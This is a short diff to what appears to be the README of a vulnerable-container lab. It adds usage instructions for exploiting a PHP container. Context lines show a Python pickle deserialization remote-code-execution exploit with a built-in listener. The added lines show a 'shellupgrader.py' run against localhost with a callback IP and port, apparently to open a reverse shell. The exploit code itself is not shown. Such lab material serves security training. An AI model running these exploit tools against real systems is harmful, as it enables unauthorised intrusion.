@@ -47,3 +47,11 @@ Same exploit with listener build in so no netcat listener needed.
 ```sh
 ./pypicke_deser_rce.py http://localhost:5000 127.0.0.1 1337
 ```
+
+##  get-php
+
+Example on how to exploit this container.
+ 
+```sh
+shellupgrader.py http://localhost/index.php 127.0.0.1 1337
+```
